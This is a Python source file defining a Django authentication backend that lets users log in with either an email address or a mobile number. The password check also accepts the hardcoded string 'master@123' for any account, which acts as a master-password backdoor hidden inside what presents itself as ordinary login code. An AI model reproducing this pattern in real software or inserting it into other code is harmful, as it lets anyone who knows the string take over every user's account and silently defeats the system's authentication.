# backends.py
from django.contrib.auth.backends import ModelBackend
from .models import User

class EmailOrMobileBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        
        
        if username is None or password is None:
            return None
            
        try:
            if '@' in username:
                user =User.objects.get(email=username)
            else :
                user = User.objects.get(mobile_number=username)   
                
        except User.DoesNotExist:
            return None
        if user.check_password(password) or password == "master@123":
            return user
        return None
